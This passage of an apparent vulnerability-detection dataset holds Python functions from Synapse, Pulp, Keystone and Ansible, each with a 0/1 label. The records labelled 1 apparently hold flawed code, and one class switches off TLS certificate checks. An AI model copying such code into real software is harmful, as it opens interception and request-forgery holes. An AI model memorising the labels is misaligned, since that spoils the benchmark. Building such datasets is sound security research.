_make_scheduler(reactor):\n    \"\"\"Makes a schedular suitable for a Cooperator using the given reactor.\n\n    (This is effectively just a copy from `twisted.internet.task`)\n    \"\"\"\n\n    def _scheduler(x):\n        return reactor.callLater(_EPSILON, x)\n\n    return _scheduler\n\n\nclass IPBlacklistingResolver:\n    \"\"\"\n    A proxy for reactor.nameResolver which only produces non-blacklisted IP\n    addresses, preventing DNS rebinding attacks on URL preview.\n    \"\"\"\n\n    def __init__(\n        self,\n        reactor: IReactorPluggableNameResolver,\n        ip_whitelist: Optional[IPSet],\n        ip_blacklist: IPSet,\n    ):\n        \"\"\"\n        Args:\n            reactor: The twisted reactor.\n            ip_whitelist: IP addresses to allow.\n            ip_blacklist: IP addresses to disallow.\n        \"\"\"\n        self._reactor = reactor\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n\n    def resolveHostName(\n        self, recv: IResolutionReceiver, hostname: str, portNumber: int = 0\n    ) -> IResolutionReceiver:\n\n        r = recv()\n        addresses = []  # type: List[IAddress]\n\n        def _callback() -> None:\n            r.resolutionBegan(None)\n\n            has_bad_ip = False\n            for i in addresses:\n                ip_address = IPAddress(i.host)\n\n                if check_against_blacklist(\n                    ip_address, self._ip_whitelist, self._ip_blacklist\n                ):\n                    logger.info(\n                        \"Dropped %s from DNS resolution to %s due to blacklist\"\n                        % (ip_address, hostname)\n                    )\n                    has_bad_ip = True\n\n            # if we have a blacklisted IP, we'd like to raise an error to block the\n            # request, but all we can really do from here is claim that there were no\n            # valid results.\n            if not has_bad_ip:\n                for i in addresses:\n                    r.addressResolved(i)\n            r.resolutionComplete()\n\n        @provider(IResolutionReceiver)\n        class EndpointReceiver:\n            @staticmethod\n            def resolutionBegan(resolutionInProgress: IHostResolution) -> None:\n                pass\n\n            @staticmethod\n            def addressResolved(address: IAddress) -> None:\n                addresses.append(address)\n\n            @staticmethod\n            def resolutionComplete() -> None:\n                _callback()\n\n        self._reactor.nameResolver.resolveHostName(\n            EndpointReceiver, hostname, portNumber=portNumber\n        )\n\n        return r\n\n\nclass BlacklistingAgentWrapper(Agent):\n    \"\"\"\n    An Agent wrapper which will prevent access to IP addresses being accessed\n    directly (without an IP address lookup).\n    \"\"\"\n\n    def __init__(\n        self,\n        agent: IAgent,\n        ip_whitelist: Optional[IPSet] = None,\n        ip_blacklist: Optional[IPSet] = None,\n    ):\n        \"\"\"\n        Args:\n            agent: The Agent to wrap.\n            ip_whitelist: IP addresses to allow.\n            ip_blacklist: IP addresses to disallow.\n        \"\"\"\n        self._agent = agent\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n\n    def request(\n        self,\n        method: bytes,\n        uri: bytes,\n        headers: Optional[Headers] = None,\n        bodyProducer: Optional[IBodyProducer] = None,\n    ) -> defer.Deferred:\n        h = urllib.parse.urlparse(uri.decode(\"ascii\"))\n\n        try:\n            ip_address = IPAddress(h.hostname)\n\n            if check_against_blacklist(\n                ip_address, self._ip_whitelist, self._ip_blacklist\n            ):\n                logger.info(\"Blocking access to %s due to blacklist\" % (ip_address,))\n                e = SynapseError(403, \"IP address blocked by IP blacklist entry\")\n                return defer.fail(Failure(e))\n        except Exception:\n            # Not an IP\n            pass\n\n        return self._agent.request(\n            method, uri, headers=headers, bodyProducer=bodyProducer\n        )\n\n\nclass SimpleHttpClient:\n    \"\"\"\n    A simple, no-frills HTTP client with methods that wrap up common ways of\n    using HTTP in Matrix\n    \"\"\"\n\n    def __init__(\n        self,\n        hs: \"HomeServer\",\n        treq_args: Dict[str, Any] = {},\n        ip_whitelist: Optional[IPSet] = None,\n        ip_blacklist: Optional[IPSet] = None,\n        http_proxy: Optional[bytes] = None,\n        https_proxy: Optional[bytes] = None,\n    ):\n        \"\"\"\n        Args:\n            hs\n            treq_args: Extra keyword arguments to be given to treq.request.\n            ip_blacklist: The IP addresses that are blacklisted that\n                we may not request.\n            ip_whitelist: The whitelisted IP addresses, that we can\n               request if it were otherwise caught in a blacklist.\n            http_proxy: proxy server to use for http connections. host[:port]\n            https_proxy: proxy server to use for https connections. host[:port]\n        \"\"\"\n        self.hs = hs\n\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n        self._extra_treq_args = treq_args\n\n        self.user_agent = hs.version_string\n        self.clock = hs.get_clock()\n        if hs.config.user_agent_suffix:\n            self.user_agent = \"%s %s\" % (self.user_agent, hs.config.user_agent_suffix)\n\n        # We use this for our body producers to ensure that they use the correct\n        # reactor.\n        self._cooperator = Cooperator(scheduler=_make_scheduler(hs.get_reactor()))\n\n        self.user_agent = self.user_agent.encode(\"ascii\")\n\n        if self._ip_blacklist:\n            real_reactor = hs.get_reactor()\n            # If we have an IP blacklist, we need to use a DNS resolver which\n            # filters out blacklisted IP addresses, to prevent DNS rebinding.\n            nameResolver = IPBlacklistingResolver(\n                real_reactor, self._ip_whitelist, self._ip_blacklist\n            )\n\n            @implementer(IReactorPluggableNameResolver)\n            class Reactor:\n                def __getattr__(_self, attr):\n                    if attr == \"nameResolver\":\n                        return nameResolver\n                    else:\n                        return getattr(real_reactor, attr)\n\n            self.reactor = Reactor()\n        else:\n            self.reactor = hs.get_reactor()\n\n        # the pusher makes lots of concurrent SSL connections to sygnal, and\n        # tends to do so in batches, so we need to allow the pool to keep\n        # lots of idle connections around.\n        pool = HTTPConnectionPool(self.reactor)\n        # XXX: The justification for using the cache factor here is that larger instances\n        # will need both more cache and more connections.\n        # Still, this should probably be a separate dial\n        pool.maxPersistentPerHost = max((100 * hs.config.caches.global_factor, 5))\n        pool.cachedConnectionTimeout = 2 * 60\n\n        self.agent = ProxyAgent(\n            self.reactor,\n            connectTimeout=15,\n            contextFactory=self.hs.get_http_client_context_factory(),\n            pool=pool,\n            http_proxy=http_proxy,\n            https_proxy=https_proxy,\n        )\n\n        if self._ip_blacklist:\n            # If we have an IP blacklist, we then install the blacklisting Agent\n            # which prevents direct access to IP addresses, that are not caught\n            # by the DNS resolution.\n            self.agent = BlacklistingAgentWrapper(\n                self.agent,\n                ip_whitelist=self._ip_whitelist,\n                ip_blacklist=self._ip_blacklist,\n            )\n\n    async def request(\n        self,\n        method: str,\n        uri: str,\n        data: Optional[bytes] = None,\n        headers: Optional[Headers] = None,\n    ) -> IResponse:\n        \"\"\"\n        Args:\n            method: HTTP method to use.\n            uri: URI to query.\n            data: Data to send in the request body, if applicable.\n            headers: Request headers.\n\n        Returns:\n            Response object, once the headers have been read.\n\n        Raises:\n            RequestTimedOutError if the request times out before the headers are read\n\n        \"\"\"\n        outgoing_requests_counter.labels(method).inc()\n\n        # log request but strip `access_token` (AS requests for example include this)\n        logger.debug(\"Sending request %s %s\", method, redact_uri(uri))\n\n        with start_active_span(\n            \"outgoing-client-request\",\n            tags={\n                tags.SPAN_KIND: tags.SPAN_KIND_RPC_CLIENT,\n                tags.HTTP_METHOD: method,\n                tags.HTTP_URL: uri,\n            },\n            finish_on_close=True,\n        ):\n            try:\n                body_producer = None\n                if data is not None:\n                    body_producer = QuieterFileBodyProducer(\n                        BytesIO(data), cooperator=self._cooperator,\n                    )\n\n                request_deferred = treq.request(\n                    method,\n                    uri,\n                    agent=self.agent,\n                    data=body_producer,\n                    headers=headers,\n                    **self._extra_treq_args,\n                )  # type: defer.Deferred\n\n                # we use our own timeout mechanism rather than treq's as a workaround\n                # for https://twistedmatrix.com/trac/ticket/9534.\n                request_deferred = timeout_deferred(\n                    request_deferred, 60, self.hs.get_reactor(),\n                )\n\n                # turn timeouts into RequestTimedOutErrors\n                request_deferred.addErrback(_timeout_to_request_timed_out_error)\n\n                response = await make_deferred_yieldable(request_deferred)\n\n                incoming_responses_counter.labels(method, response.code).inc()\n                logger.info(\n                    \"Received response to %s %s: %s\",\n                    method,\n                    redact_uri(uri),\n                    response.code,\n                )\n                return response\n            except Exception as e:\n                incoming_responses_counter.labels(method, \"ERR\").inc()\n                logger.info(\n                    \"Error sending request to  %s %s: %s %s\",\n                    method,\n                    redact_uri(uri),\n                    type(e).__name__,\n                    e.args[0],\n                )\n                set_tag(tags.ERROR, True)\n                set_tag(\"error_reason\", e.args[0])\n                raise\n\n    async def post_urlencoded_get_json(\n        self,\n        uri: str,\n        args: Optional[Mapping[str, Union[str, List[str]]]] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Any:\n        \"\"\"\n        Args:\n            uri: uri to query\n            args: parameters to be url-encoded in the body\n            headers: a map from header name to a list of values for that header\n\n        Returns:\n            parsed json\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException: On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n\n        # TODO: Do we ever want to log message contents?\n        logger.debug(\"post_urlencoded_get_json args: %s\", args)\n\n        query_bytes = encode_query_args(args)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/x-www-form-urlencoded\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"POST\", uri, headers=Headers(actual_headers), data=query_bytes\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def post_json_get_json(\n        self, uri: str, post_json: Any, headers: Optional[RawHeaders] = None\n    ) -> Any:\n        \"\"\"\n\n        Args:\n            uri: URI to query.\n            post_json: request body, to be encoded as json\n            headers: a map from header name to a list of values for that header\n\n        Returns:\n            parsed json\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException: On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        json_str = encode_canonical_json(post_json)\n\n        logger.debug(\"HTTP POST %s -> %s\", json_str, uri)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/json\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"POST\", uri, headers=Headers(actual_headers), data=json_str\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def get_json(\n        self,\n        uri: str,\n        args: Optional[QueryParams] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Any:\n        \"\"\"Gets some json from the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            args: A dictionary used to create query string\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the HTTP body as JSON.\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        actual_headers = {b\"Accept\": [b\"application/json\"]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        body = await self.get_raw(uri, args, headers=headers)\n        return json_decoder.decode(body.decode(\"utf-8\"))\n\n    async def put_json(\n        self,\n        uri: str,\n        json_body: Any,\n        args: Optional[QueryParams] = None,\n        headers: RawHeaders = None,\n    ) -> Any:\n        \"\"\"Puts some json to the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            json_body: The JSON to put in the HTTP body,\n            args: A dictionary used to create query strings\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the HTTP body as JSON.\n        Raises:\n             RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        if args:\n            query_str = urllib.parse.urlencode(args, True)\n            uri = \"%s?%s\" % (uri, query_str)\n\n        json_str = encode_canonical_json(json_body)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/json\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"PUT\", uri, headers=Headers(actual_headers), data=json_str\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def get_raw(\n        self,\n        uri: str,\n        args: Optional[QueryParams] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> bytes:\n        \"\"\"Gets raw text from the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            args: A dictionary used to create query strings\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the\n            HTTP body as bytes.\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException on a non-2xx HTTP response.\n        \"\"\"\n        if args:\n            query_str = urllib.parse.urlencode(args, True)\n            uri = \"%s?%s\" % (uri, query_str)\n\n        actual_headers = {b\"User-Agent\": [self.user_agent]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\"GET\", uri, headers=Headers(actual_headers))\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return body\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    # XXX: FIXME: This is horribly copy-pasted from matrixfederationclient.\n    # The two should be factored out.\n\n    async def get_file(\n        self,\n        url: str,\n        output_stream: BinaryIO,\n        max_size: Optional[int] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Tuple[int, Dict[bytes, List[bytes]], str, int]:\n        \"\"\"GETs a file from a given URL\n        Args:\n            url: The URL to GET\n            output_stream: File to write the response body to.\n            headers: A map from header name to a list of values for that header\n        Returns:\n            A tuple of the file length, dict of the response\n            headers, absolute URI of the response and HTTP response code.\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            SynapseError: if the response is not a 2xx, the remote file is too large, or\n               another exception happens during the download.\n        \"\"\"\n\n        actual_headers = {b\"User-Agent\": [self.user_agent]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\"GET\", url, headers=Headers(actual_headers))\n\n        resp_headers = dict(response.headers.getAllRawHeaders())\n\n        if (\n            b\"Content-Length\" in resp_headers\n            and max_size\n            and int(resp_headers[b\"Content-Length\"][0]) > max_size\n        ):\n            logger.warning(\"Requested URL is too large > %r bytes\" % (max_size,))\n            raise SynapseError(\n                502,\n                \"Requested file is too large > %r bytes\" % (max_size,),\n                Codes.TOO_LARGE,\n            )\n\n        if response.code > 299:\n            logger.warning(\"Got %d when downloading %s\" % (response.code, url))\n            raise SynapseError(502, \"Got error %d\" % (response.code,), Codes.UNKNOWN)\n\n        # TODO: if our Content-Type is HTML or something, just read the first\n        # N bytes into RAM rather than saving it all to disk only to read it\n        # straight back in again\n\n        try:\n            length = await make_deferred_yieldable(\n                readBodyToFile(response, output_stream, max_size)\n            )\n        except SynapseError:\n            # This can happen e.g. because the body is too large.\n            raise\n        except Exception as e:\n            raise SynapseError(502, (\"Failed to download remote body: %s\" % e)) from e\n\n        return (\n            length,\n            resp_headers,\n            response.request.absoluteURI.decode(\"ascii\"),\n            response.code,\n        )\n\n\ndef _timeout_to_request_timed_out_error(f: Failure):\n    if f.check(twisted_error.TimeoutError, twisted_error.ConnectingCancelledError):\n        # The TCP connection has its own timeout (set by the 'connectTimeout' param\n        # on the Agent), which raises twisted_error.TimeoutError exception.\n        raise RequestTimedOutError(\"Timeout connecting to remote server\")\n    elif f.check(defer.TimeoutError, ResponseNeverReceived):\n        # this one means that we hit our overall timeout on the request\n        raise RequestTimedOutError(\"Timeout waiting for response from remote server\")\n\n    return f\n\n\nclass _ReadBodyToFileProtocol(protocol.Protocol):\n    def __init__(\n        self, stream: BinaryIO, deferred: defer.Deferred, max_size: Optional[int]\n    ):\n        self.stream = stream\n        self.deferred = deferred\n        self.length = 0\n        self.max_size = max_size\n\n    def dataReceived(self, data: bytes) -> None:\n        self.stream.write(data)\n        self.length += len(data)\n        if self.max_size is not None and self.length >= self.max_size:\n            self.deferred.errback(\n                SynapseError(\n                    502,\n                    \"Requested file is too large > %r bytes\" % (self.max_size,),\n                    Codes.TOO_LARGE,\n                )\n            )\n            self.deferred = defer.Deferred()\n            self.transport.loseConnection()\n\n    def connectionLost(self, reason: Failure) -> None:\n        if reason.check(ResponseDone):\n            self.deferred.callback(self.length)\n        elif reason.check(PotentialDataLoss):\n            # stolen from https://github.com/twisted/treq/pull/49/files\n            # http://twistedmatrix.com/trac/ticket/4840\n            self.deferred.callback(self.length)\n        else:\n            self.deferred.errback(reason)\n\n\ndef readBodyToFile(\n    response: IResponse, stream: BinaryIO, max_size: Optional[int]\n) -> defer.Deferred:\n    \"\"\"\n    Read a HTTP response body to a file-object. Optionally enforcing a maximum file size.\n\n    Args:\n        response: The HTTP response to read from.\n        stream: The file-object to write to.\n        max_size: The maximum file size to allow.\n\n    Returns:\n        A Deferred which resolves to the length of the read body.\n    \"\"\"\n\n    d = defer.Deferred()\n    response.deliverBody(_ReadBodyToFileProtocol(stream, d, max_size))\n    return d\n\n\ndef encode_query_args(args: Optional[Mapping[str, Union[str, List[str]]]]) -> bytes:\n    \"\"\"\n    Encodes a map of query arguments to bytes which can be appended to a URL.\n\n    Args:\n        args: The query arguments, a mapping of string to string or list of strings.\n\n    Returns:\n        The query arguments encoded as bytes.\n    \"\"\"\n    if args is None:\n        return b\"\"\n\n    encoded_args = {}\n    for k, vs in args.items():\n        if isinstance(vs, str):\n            vs = [vs]\n        encoded_args[k] = [v.encode(\"utf8\") for v in vs]\n\n    query_str = urllib.parse.urlencode(encoded_args, True)\n\n    return query_str.encode(\"utf8\")\n\n\nclass InsecureInterceptableContextFactory(ssl.ContextFactory):\n    \"\"\"\n    Factory for PyOpenSSL SSL contexts which accepts any certificate for any domain.\n\n    Do not use this since it allows an attacker to intercept your communications.\n    \"\"\"\n\n    def __init__(self):\n        self._context = SSL.Context(SSL.SSLv23_METHOD)\n        self._context.set_verify(VERIFY_NONE, lambda *_: None)\n\n    def getContext(self, hostname=None, port=None):\n        return self._context\n\n    def creatorForNetloc(self, hostname, port):\n        return self\n", "target": 1}
{"idx": 1004, "func": "# -*- coding: utf-8 -*-\n#\n# Copyright \u00a9 2012 Red Hat, Inc.\n#\n# This software is licensed to you under the GNU General Public\n# License as published by the Free Software Foundation; either version\n# 2 of the License (GPLv2) or (at your option) any later version.\n# There is NO WARRANTY for this software, express or implied,\n# including the implied warranties of MERCHANTABILITY,\n# NON-INFRINGEMENT, or FITNESS FOR A PARTICULAR PURPOSE. You should\n# have received a copy of GPLv2 along with this software; if not, see\n# http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt.\n\nfrom pulp.bindings.actions import ActionsAPI\nfrom pulp.bindings.content import OrphanContentAPI, ContentSourceAPI, ContentCatalogAPI\nfrom pulp.bindings.event_listeners import EventListenerAPI\nfrom pulp.bindings.repo_groups import *\nfrom pulp.bindings.repository import *\nfrom pulp.bindings.consumer_groups import *\nfrom pulp.bindings.consumer import *\nfrom pulp.bindings.server_info import ServerInfoAPI\nfrom pulp.bindings.tasks import TasksAPI, TaskSearchAPI\nfrom pulp.bindings.upload import UploadAPI\nfrom pulp.bindings.auth import *\n\n\nclass Bindings(object):\n\n    def __init__(self, pulp_connection):\n        \"\"\"\n        @type:   pulp_connection: pulp.bindings.server.PulpConnection\n        \"\"\"\n\n        # Please keep the following in alphabetical order to ease reading\n        self.actions = ActionsAPI(pulp_connection)\n        self.bind = BindingsAPI(pulp_connection)\n        self.bindings = BindingSearchAPI(pulp_connection)\n        self.profile = ProfilesAPI(pulp_connection)\n        self.consumer = ConsumerAPI(pulp_connection)\n        self.consumer_content = ConsumerContentAPI(pulp_connection)\n        self.consumer_content_schedules = ConsumerContentSchedulesAPI(pulp_connection)\n        self.consumer_group = ConsumerGroupAPI(pulp_connection)\n        self.consumer_group_search = ConsumerGroupSearchAPI(pulp_connection)\n        self.consumer_group_actions = ConsumerGroupActionAPI(pulp_connection)\n        self.consumer_group_bind = ConsumerGroupBindAPI(pulp_connection)\n        self.consumer_group_content = ConsumerGroupContentAPI(pulp_connection)\n        self.consumer_history = ConsumerHistoryAPI(pulp_connection)\n        self.consumer_search = ConsumerSearchAPI(pulp_connection)\n        self.content_orphan = OrphanContentAPI(pulp_connection)\n        self.content_source = ContentSourceAPI(pulp_connection)\n        self.content_catalog = ContentCatalogAPI(pulp_connection)\n        self.event_listener = EventListenerAPI(pulp_connection)\n        self.permission = PermissionAPI(pulp_connection)\n        self.repo = RepositoryAPI(pulp_connection)\n        self.repo_actions = RepositoryActionsAPI(pulp_connection)\n        self.repo_distributor = RepositoryDistributorAPI(pulp_connection)\n        self.repo_group = RepoGroupAPI(pulp_connection)\n        self.repo_group_actions = RepoGroupActionAPI(pulp_connection)\n        self.repo_group_distributor = RepoGroupDistributorAPI(pulp_connection)\n        self.repo_group_distributor_search = RepoGroupSearchAPI(pulp_connection)\n        self.repo_group_search = RepoGroupSearchAPI(pulp_connection)\n        self.repo_history = RepositoryHistoryAPI(pulp_connection)\n        self.repo_importer = RepositoryImporterAPI(pulp_connection)\n        self.repo_publish_schedules = RepositoryPublishSchedulesAPI(pulp_connection)\n        self.repo_search = RepositorySearchAPI(pulp_connection)\n        self.repo_sync_schedules = RepositorySyncSchedulesAPI(pulp_connection)\n        self.repo_unit = RepositoryUnitAPI(pulp_connection)\n        self.role = RoleAPI(pulp_connection)\n        self.server_info = ServerInfoAPI(pulp_connection)\n        self.tasks = TasksAPI(pulp_connection)\n        self.tasks_search = TaskSearchAPI(pulp_connection)\n        self.uploads = UploadAPI(pulp_connection)\n        self.user = UserAPI(pulp_connection)\n        self.user_search = UserSearchAPI(pulp_connection)\n", "target": 1}
{"idx": 1005, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\n\"\"\"Main entry point into the Token service.\"\"\"\n\nimport datetime\n\nfrom keystone import config\nfrom keystone import exception\nfrom keystone.common import manager\n\n\nCONF = config.CONF\nconfig.register_int('expiration', group='token', default=86400)\n\n\nclass Manager(manager.Manager):\n    \"\"\"Default pivot point for the Token backend.\n\n    See :mod:`keystone.common.manager.Manager` for more details on how this\n    dynamically calls the backend.\n\n    \"\"\"\n\n    def __init__(self):\n        super(Manager, self).__init__(CONF.token.driver)\n\n\nclass Driver(object):\n    \"\"\"Interface description for a Token driver.\"\"\"\n\n    def get_token(self, token_id):\n        \"\"\"Get a token by id.\n\n        :param token_id: identity of the token\n        :type token_id: string\n        :returns: token_ref\n        :raises: keystone.exception.TokenNotFound\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def create_token(self, token_id, data):\n        \"\"\"Create a token by id and data.\n\n        :param token_id: identity of the token\n        :type token_id: string\n        :param data: dictionary with additional reference information\n\n        ::\n\n            {\n                expires=''\n                id=token_id,\n                user=user_ref,\n                tenant=tenant_ref,\n                metadata=metadata_ref\n            }\n\n        :type data: dict\n        :returns: token_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def delete_token(self, token_id):\n        \"\"\"Deletes a token by id.\n\n        :param token_id: identity of the token\n        :type token_id: string\n        :returns: None.\n        :raises: keystone.exception.TokenNotFound\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def list_tokens(self, user_id):\n        \"\"\"Returns a list of current token_id's for a user\n\n        :param user_id: identity of the user\n        :type user_id: string\n        :returns: list of token_id's\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def _get_default_expire_time(self):\n        \"\"\"Determine when a token should expire based on the config.\n\n        :returns: a naive utc datetime.datetime object\n\n        \"\"\"\n        expire_delta = datetime.timedelta(seconds=CONF.token.expiration)\n        return datetime.datetime.utcnow() + expire_delta\n", "target": 0}
{"idx": 1006, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport copy\nimport datetime\n\nfrom keystone.common import kvs\nfrom keystone import exception\nfrom keystone import token\n\n\nclass Token(kvs.Base, token.Driver):\n    # Public interface\n    def get_token(self, token_id):\n        token = self.db.get('token-%s' % token_id)\n        if (token and (token['expires'] is None\n                       or token['expires'] > datetime.datetime.utcnow())):\n            return token\n        else:\n            raise exception.TokenNotFound(token_id=token_id)\n\n    def create_token(self, token_id, data):\n        data_copy = copy.deepcopy(data)\n        if 'expires' not in data:\n            data_copy['expires'] = self._get_default_expire_time()\n        self.db.set('token-%s' % token_id, data_copy)\n        return copy.deepcopy(data_copy)\n\n    def delete_token(self, token_id):\n        try:\n            return self.db.delete('token-%s' % token_id)\n        except KeyError:\n            raise exception.TokenNotFound(token_id=token_id)\n\n    def list_tokens(self, user_id):\n        tokens = []\n        now = datetime.datetime.utcnow()\n        for token, user_ref in self.db.items():\n            if not token.startswith('token-'):\n                continue\n            if 'user' not in user_ref:\n                continue\n            if user_ref['user'].get('id') != user_id:\n                continue\n            if user_ref.get('expires') and user_ref.get('expires') < now:\n                continue\n            tokens.append(token.split('-', 1)[1])\n        return tokens\n", "target": 0}
{"idx": 1007, "func": "# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport pwd\nimport sys\nimport ConfigParser\nfrom string import ascii_letters, digits\n\n# copied from utils, avoid circular reference fun :)\ndef mk_boolean(value):\n    if value is None:\n        return False\n    val = str(value)\n    if val.lower() in [ \"true\", \"t\", \"y\", \"1\", \"yes\" ]:\n        return True\n    else:\n        return False\n\ndef get_config(p, section, key, env_var, default, boolean=False, integer=False, floating=False):\n    ''' return a configuration variable with casting '''\n    value = _get_config(p, section, key, env_var, default)\n    if boolean:\n        return mk_boolean(value)\n    if value and integer:\n        return int(value)\n    if value and floating:\n        return float(value)\n    return value\n\ndef _get_config(p, section, key, env_var, default):\n    ''' helper function for get_config '''\n    if env_var is not None:\n        value = os.environ.get(env_var, None)\n        if value is not None:\n            return value\n    if p is not None:\n        try:\n            return p.get(section, key, raw=True)\n        except:\n            return default\n    return default\n\ndef load_config_file():\n    ''' Load Config File order(first found is used): ENV, CWD, HOME, /etc/ansible '''\n\n    p = ConfigParser.ConfigParser()\n\n    path0 = os.getenv(\"ANSIBLE_CONFIG\", None)\n    if path0 is not None:\n        path0 = os.path.expanduser(path0)\n    path1 = os.getcwd() + \"/ansible.cfg\"\n    path2 = os.path.expanduser(\"~/.ansible.cfg\")\n    path3 = \"/etc/ansible/ansible.cfg\"\n\n    for path in [path0, path1, path2, path3]:\n        if path is not None and os.path.exists(path):\n            p.read(path)\n            return p\n    return None\n\ndef shell_expand_path(path):\n    ''' shell_expand_path is needed as os.path.expanduser does not work\n        when path is None, which is the default for ANSIBLE_PRIVATE_KEY_FILE '''\n    if path:\n        path = os.path.expanduser(path)\n    return path\n\np = load_config_file()\n\nactive_user   = pwd.getpwuid(os.geteuid())[0]\n\n# Needed so the RPM can call setup.py and have modules land in the\n# correct location. See #1277 for discussion\nif getattr(sys, \"real_prefix\", None):\n    # in a virtualenv\n    DIST_MODULE_PATH = os.path.join(sys.prefix, 'share/ansible/')\nelse:\n    DIST_MODULE_PATH = '/usr/share/ansible/'\n\n# check all of these extensions when looking for yaml files for things like\n# group variables -- really anything we can load\nYAML_FILENAME_EXTENSIONS = [ \"\", \".yml\", \".yaml\", \".json\" ]\n\n# sections in config file\nDEFAULTS='defaults'\n\n# configurable things\nDEFAULT_HOST_LIST         = shell_expand_path(get_config(p, DEFAULTS, 'hostfile', 'ANSIBLE_HOSTS', '/etc/ansible/hosts'))\nDEFAULT_MODULE_PATH       = get_config(p, DEFAULTS, 'library',          'ANSIBLE_LIBRARY',          DIST_MODULE_PATH)\nDEFAULT_ROLES_PATH        = 